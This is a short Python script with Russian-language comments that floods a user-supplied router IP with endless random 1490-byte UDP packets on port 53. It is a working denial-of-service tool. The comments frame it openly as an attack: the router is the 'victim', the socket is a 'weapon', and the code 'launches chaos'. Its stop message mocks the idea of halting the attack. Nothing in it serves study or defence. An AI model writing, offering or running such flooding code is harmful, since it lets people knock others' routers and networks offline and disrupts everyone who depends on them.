import socket  
import random  

# ШАГ 1: ВВОД ЖЕРТВЫ  
target_ip = input("ВВЕДИ IP РОУТЕРА (например, 192.168.1.1 или 10.0.0.1): ")  

# ШАГ 2: СОЗДАНИЕ ОРУЖИЯ  
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
bytes = random._urandom(1490)  # Байты из цифрового чистилища  

# ШАГ 3: ЗАПУСК ХАОСА  
print(f"\n[АКТИВИРОВАН АДСКИЙ ПРОТОКОЛ] Атакую {target_ip}:53...")  
print("Нажмите Ctrl+C чтобы остановить (но зачем?)")  

try:  
    while True:  
        sock.sendto(bytes, (target_ip, 53))  
except KeyboardInterrupt:  
    print("\n[СИГНАЛ ПРЕРЫВАНИЯ] Смерть отменена. Как скучно.")  
finally:  
    sock.close()  
